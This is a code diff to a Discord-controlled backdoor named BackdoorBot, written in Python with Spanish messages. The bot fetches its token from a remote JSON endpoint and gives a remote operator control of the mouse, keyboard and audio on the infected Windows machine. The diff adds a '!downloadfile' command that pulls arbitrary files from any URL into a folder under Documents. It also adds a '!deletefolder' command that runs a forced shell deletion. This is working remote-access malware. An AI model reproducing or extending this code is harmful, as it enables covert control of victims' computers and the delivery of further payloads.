@@ -3,13 +3,13 @@ import discord
 import pyautogui, keyboard
 import io
 import subprocess, threading
-import playsound, winsound, pygame.mixer
+import winsound, pygame.mixer
 import os
 import requests
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
-import ctypes
+from ctypes import POINTER, cast
 from comtypes import CLSCTX_ALL
-import shutil
+
 
 def get_documents_folder():
     CSIDL_PERSONAL = 5
@@ -20,10 +20,23 @@ def get_documents_folder():
     return buf.value
 
 temp_dir = os.path.join(get_documents_folder())
+
 recording = False
 recorded_keys = []
 recording_thread = None
-app_version = "1.0.0"
+app_version = "1.1.0"
+
+def download_file(url, filename):
+    temp_dir = os.path.join(get_documents_folder())
+    if not os.path.exists(os.path.join(temp_dir, "etc")):
+        os.makedirs(os.path.join(temp_dir, "etc"))
+    temp_dir = os.path.join(temp_dir, "etc")
+    response = requests.get(url)
+    if response.status_code == 200:
+        with open(os.path.join(temp_dir, filename), 'wb') as file:
+            file.write(response.content)
+    else:
+        raise Exception("Error al descargar el archivo desde la URL proporcionada")
 
 def fetch_token():
     response = requests.get("https://api.npoint.io/db9d3767c9e0cb7889a4")
@@ -215,6 +228,20 @@ class BackdoorBot(discord.Client):
         elif message.content.startswith("!rightclick"):
             pyautogui.click(button='right')
             await message.channel.send("Clic derecho realizado.")
+        elif message.content.startswith("!downloadfile"):
+            link = str(message.content.split(" ")[1])
+            filename = link.split("/")[-1]
+            await message.channel.send(f"Descargando archivo desde: {link}")
+            try:
+                download_file(link, filename)
+                await message.channel.send(f"Archivo descargado: {filename}")
+            except Exception as e:
+                await message.channel.send(f"Error al descargar el archivo: {e}")
+        elif message.content.startswith("!deletefolder"):
+            if os.path.exists(os.path.join(temp_dir, "etc")):
+                folder_path = os.path.join(temp_dir, "etc")
+                subprocess.run(f'rmdir /s /q "{folder_path}"', shell=True)
+                await message.channel.send("Carpeta eliminada.")
             
 
 
